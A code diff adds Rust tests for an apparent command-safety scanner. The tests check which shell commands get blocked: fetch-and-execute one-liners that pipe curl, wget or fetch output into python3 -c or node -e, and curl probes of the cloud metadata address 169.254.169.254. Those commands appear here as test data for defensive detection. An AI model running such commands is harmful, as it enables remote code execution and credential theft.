@@ -368,3 +368,161 @@ fn issue_264_zsh_comment_text_keeps_variable_commands_incomplete() {
         }
     }
 }
+
+#[test]
+fn downloaded_python_and_node_inline_source_reaches_exec_and_full_analysis() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"python3 -c "$(curl -s https://get.example.com/x.py)""#,
+        r#"python3 -c "$(curl --user-agent '-o/tmp/unused' https://example.com/x.py)""#,
+        r#"python3 -c "$(curl -O https://example.com/data.txt https://example.com/x.py)""#,
+        r#"python3 -c "$(curl --remote-name-all https://example.com/data.txt --next https://example.com/x.py)""#,
+        r#"python3 -c "$(curl --remote-name-all https://example.com/data.txt -: https://example.com/x.py)""#,
+        r#"node -e "$(curl -s https://get.example.com/x.js)""#,
+        r#"env LANG=C python3 -u -c "$(command curl https://example.com/x.py)""#,
+        r#"node --eval="$(curl https://example.com/x.js)""#,
+        r#"'python3' '-c' "$('curl' 'https:/example.com/x.py')""#,
+        r#"sh -c 'node -e "$(curl https://example.com/x.js)"'"#,
+        r#"python3 -c "$(wget -qO- https://example.com/x.py)""#,
+        r#"python3 -c "$(fetch -o - example.com/x.py)""#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(input, context, force_full);
+                assert_eq!(verdict.action, Action::Block, "{input}: {verdict:?}");
+                assert!(
+                    verdict.findings.iter().any(|finding| {
+                        finding.rule_id == RuleId::InterpreterSuspiciousInlineExec
+                    }),
+                    "{input}: {verdict:?}"
+                );
+                assert_eq!(verdict.tier_reached, 3, "{input}: {verdict:?}");
+            }
+        }
+    }
+    for input in [
+        "python3 -c 'print(1)'",
+        r#"node -e 'console.log("curl https://example.com/x.js")'"#,
+        r#"python3 -c 'import sys; print(sys.argv[1])' "$(curl https://example.com/data)""#,
+        r#"node -e 'console.log(process.argv[1])' "$(curl https://example.com/data)""#,
+        r#"printf %s "$(curl https://example.com/data)""#,
+        r#"python3 -c "$(echo 'print(1) # curl https://example.com/x.py')""#,
+        r#"python3 -c "$(curl --proxy https://proxy.example -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+        r#"python3 -c "$(curl --doh-url https://dns.example/dns-query -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+        r#"python3 -c "$(curl --user-agent '-o-' -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+        r#"python3 -c "$(curl --remote-name-all https://example.com/a.py https://example.com/b.py; printf 'print(1)')""#,
+        r#"python3 -c "$(curl -O https://example.com/a.py -O https://example.com/b.py; printf 'print(1)')""#,
+        r#"python3 -c "$(curl --remote-name-all https://example.com/a.py --next -O https://example.com/b.py; printf 'print(1)')""#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            let verdict = analyze(input, context, true);
+            assert_eq!(verdict.action, Action::Allow, "{input}: {verdict:?}");
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {verdict:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn curl_metadata_uses_its_one_through_three_slash_authority_in_full_checks() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for slashes in ["/", "//", "///"] {
+        for input in [
+            format!("curl http:{slashes}169.254.169.254/latest/meta-data/"),
+            format!("env curl --url='http:{slashes}169.254.169.254/latest/meta-data/'"),
+            format!("sh -c 'curl http:{slashes}169.254.169.254/latest/meta-data/'"),
+        ] {
+            for context in [ScanContext::Exec, ScanContext::Paste] {
+                for force_full in [false, true] {
+                    let verdict = analyze(&input, context, force_full);
+                    assert_eq!(verdict.action, Action::Block, "{input}: {verdict:?}");
+                    for rule in [
+                        RuleId::MetadataEndpoint,
+                        RuleId::RawIpUrl,
+                        RuleId::PlainHttpToSink,
+                    ] {
+                        assert!(
+                            verdict
+                                .findings
+                                .iter()
+                                .any(|finding| finding.rule_id == rule),
+                            "{input}: {rule:?}: {verdict:?}"
+                        );
+                    }
+                    assert_eq!(verdict.tier_reached, 3, "{input}: {verdict:?}");
+                }
+            }
+        }
+        for input in [
+            format!("curl https:{slashes}example.com/health"),
+            format!("curl https:{slashes}example.com/path/http://169.254.169.254/x"),
+            format!("sh -c 'curl https:{slashes}example.com/path/http://169.254.169.254/x'"),
+        ] {
+            for context in [ScanContext::Exec, ScanContext::Paste] {
+                let verdict = analyze(&input, context, true);
+                assert_eq!(verdict.action, Action::Allow, "{input}: {verdict:?}");
+                assert!(
+                    verdict
+                        .findings
+                        .iter()
+                        .all(|finding| finding.rule_id != RuleId::MetadataEndpoint),
+                    "{input}: {verdict:?}"
+                );
+            }
+        }
+    }
+}
+
+#[test]
+fn npm_metadata_queries_exempt_only_literal_registry_selectors() {
+    let _state = GlobalStateGuard::new().unwrap();
+    let inert = "npm view vitest@4.1.11 version --registry=https://registry.npmjs.org/ --userconfig=/qualification/empty.npmrc --globalconfig=/qualification/empty.npmrc --cache=/qualification/npm-cache --fetch-retries=1 --ignore-scripts --no-audit --no-fund";
+    for input in [
+        inert.to_string(),
+        "npm info 'vitest@4.1.11' version".into(),
+        "npm show \"vitest@4.1.11\" version".into(),
+        "command npm v vitest@4.1.11 version".into(),
+        format!("env LANG=C {inert}"),
+        format!("env -S '{inert}'"),
+        format!("sh -c '{inert}'"),
+        "env -S 'git clone git@github.com:http://4.1.0.11/repo.git'".into(),
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(&input, context, force_full);
+                assert_eq!(verdict.action, Action::Allow, "{input}: {verdict:?}");
+                assert!(
+                    verdict.findings.iter().all(|finding| {
+                        !matches!(finding.rule_id, RuleId::RawIpUrl | RuleId::SchemelessToSink)
+                    }),
+                    "{input}: {verdict:?}"
+                );
+            }
+        }
+    }
+    for input in [
+        "npm view https://4.1.0.11/package.tgz version",
+        "npm info vitest@https://4.1.0.11/package.tgz version",
+        "npm view vitest@4.1.11 version --registry=https://4.1.0.11/",
+        "env -S 'npm view https://4.1.0.11/package.tgz version'",
+        "git clone git@4.1.0.11:repo.git",
+        "scp user@4.1.0.11:repo.git destination",
+        "rsync -a user@4.1.0.11:repo.git destination",
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            let verdict = analyze(input, context, false);
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::RawIpUrl),
+                "{input}: {verdict:?}"
+            );
+        }
+    }
+}
